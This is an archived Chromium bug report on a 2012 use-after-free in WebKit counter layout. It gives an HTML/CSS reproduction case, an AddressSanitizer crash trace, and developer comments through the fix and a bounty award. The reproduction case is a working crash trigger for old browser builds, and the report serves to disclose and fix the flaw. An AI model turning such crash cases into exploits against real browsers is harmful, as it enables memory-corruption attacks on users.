# Use-after-free due to issues in counter layout.

| Field | Value |
|-------|-------|
| **Issue ID** | [40055873](https://issues.chromium.org/issues/40055873) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2012-03-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

use-after-free in WebCore::RenderObject::container

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1085.0 (Developer Build 129583)  

OS Linux  

WebKit 536.5 (@112458)

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-animation-name: a;
-webkit-animation-duration: 1s;
counter-reset: c;
}
#el0::before {
content: counter(c);
counter-reset: c;
width: 1px;
height: 1px;
overflow-x: scroll;
display: block;
}
#el0::after {
counter-reset: c;
display: table-header-group;
content: counter(c);
}
#el2 {
counter-reset: c;
}
#el3::before {
content: counter(c);
}
</style>
<script>
onload = function() {
el0=document.createElement('div')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
document.body.appendChild(el1)
el2=document.createElement('div')
el2.setAttribute('id','el2')
el1.appendChild(el2)
el3=document.createElement('div')
el3.setAttribute('id','el3')
document.body.appendChild(el3)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==16346== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffeca75098 at pc 0x55555ac88045 bp 0x7fffffff9100 sp 0x7fffffff90f8  

READ of size 8 at 0x7fffeca75098 thread T0  

#0 0x55555ac88045 in WebCore::RenderObject::container(WebCore::RenderBoxModelObject\*, bool\*) const ???:0  

#1 0x55555ac86e99 in WebCore::RenderObject::markContainingBlocksForLayout(bool, WebCore::RenderObject\*) ???:0  

#2 0x55555a557d3a in WebCore::FrameView::scheduleRelayout() ???:0

0x7fffeca75098 is located 24 bytes inside of 184-byte region [0x7fffeca75080,0x7fffeca75138)  

freed by thread T0 here:  

#0 0x55555de50f32 in free ??:0  

#1 0x55555aca5bc2 in WebCore::RenderObjectChildList::updateBeforeAfterContent(WebCore::RenderObject\*, WebCore::PseudoId, WebCore::RenderObject const\*) ???:0  

#2 0x55555aa389ec in WebCore::RenderBlock::styleDidChange(WebCore::StyleDifference, WebCore::RenderStyle const\*) ???:0

## Attachments

- 24184.txt (text/x-c; charset=us-ascii, 9.6 KB)
- [24184.html](attachments/24184.html) (text/html; charset=us-ascii, 1.1 KB)
- [beta-24184.txt](attachments/beta-24184.txt) (text/x-c; charset=us-ascii, 9.4 KB)
- [stable-24184.txt](attachments/stable-24184.txt) (text/x-c; charset=us-ascii, 9.4 KB)

## Timeline

### in...@chromium.org (2012-03-29)

[Empty comment from Monorail migration]

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-30)

Reverting wrong marking of security bugs by release management.

### in...@chromium.org (2012-04-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-01)

Weird, dupes are not showing here. Anthony, any idea what is going wrong with the issue tracker wrt security bugs.

1. http://code.google.com/p/chromium/issues/detail?id=121291
2. http://code.google.com/p/chromium/issues/detail?id=121290
3. http://code.google.com/p/chromium/issues/detail?id=115912
4. http://code.google.com/p/chromium/issues/detail?id=120222

### mi...@gmail.com (2012-04-01)

:(

### in...@chromium.org (2012-04-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-04-02)

@inferno: did we mean to merge the older bug into this newer one?

### in...@chromium.org (2012-04-02)

We just have to keep all these counter bugs in one master bug. Since all others were duped against this one, i did the same for 108958. We can fix the credits later.

### sc...@gmail.com (2012-04-02)

Superstar Ken is looking at this one.

### sc...@gmail.com (2012-04-02)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-03)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-04-03)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-04-03)

See http://code.google.com/p/chromium/issues/detail?id=120921 for a long discussion.

I think we are open to security issues with any text element (and maybe others) in a node that gets marked for layout during layout.

### ke...@chromium.org (2012-04-04)

I can go back to looking at counters after, but I've separated 108958 back out from this and I'm trying to fix that one first.

If anyone is inclined to steal this in the meantime feel free.

### ke...@chromium.org (2012-04-12)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-04-12)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=35921152

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fcfe384a298
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::RenderObjectChildList::updateBeforeAfterContent
  WebCore::RenderBlock::styleDidChange
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95T-wkB8UtINNejsfb36-TkqpWA9aLh6OfZrsYtvO5B53ynHEVDQhTRdjiYfyjkl9VtdKL3xvZFpNW_93uTJJIS8Qb_oiFTxTJ86TD_V47On1w2Po7OphkoePURwGgHMqu8g7egQ3m8eEuHl_GjiVqYhx8veA

### in...@chromium.org (2012-04-13)

Renaming the bug title since it conflicts with another bug.

### in...@chromium.org (2012-04-16)

https://bugs.webkit.org/show_bug.cgi?id=84002

### in...@chromium.org (2012-04-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-16)

m19 is out, moving milestone m18 bugs to m19.

### ke...@chromium.org (2012-05-18)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-05-24)

These are the test cases that still repro at this point, aside from the first one that started this bug:
https://cluster-fuzz.appspot.com/testcase?key=30740098  (originally from https://crbug.com/chromium/120222)

https://cluster-fuzz.appspot.com/testcase?key=43502492 (originally from https://crbug.com/chromium/126404)

+ all the test cases from https://crbug.com/chromium/121128 but some of those repros are really hard to look at

### in...@chromium.org (2012-05-25)

http://trac.webkit.org/changeset/118452

### sc...@gmail.com (2012-05-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-25)

Reopening, needs a minor fix.

### in...@chromium.org (2012-05-25)

Use this instead - http://trac.webkit.org/changeset/118542

### in...@chromium.org (2012-05-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-05-28)

ClusterFuzz has detected this issue as fixed in range 139082:139098.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=35921152

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ff33660da98
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::RenderObjectChildList::updateBeforeAfterContent
  WebCore::RenderBlock::styleDidChange
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=139082:139098

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94FVj-ykvMa5QK5Gjo3n-OgSYnuNI3WBwius_ToiGfae7XTj-W93xH8UijqoAoU8zNmofoSb8bwWLCCUxm_Z8B5Kfa3JS-4aXQr1TFldPhHJJzDUAXvW2ZEl4p2BLJ0CJdOTnwRcfsflcnmbqkXnF7SDgBMcA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-06-06)

M20: http://trac.webkit.org/changeset/119621

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/120944?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/119087, crbug.com/chromium/120695, crbug.com/chromium/121290, crbug.com/chromium/124550, crbug.com/chromium/126404]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055873)*
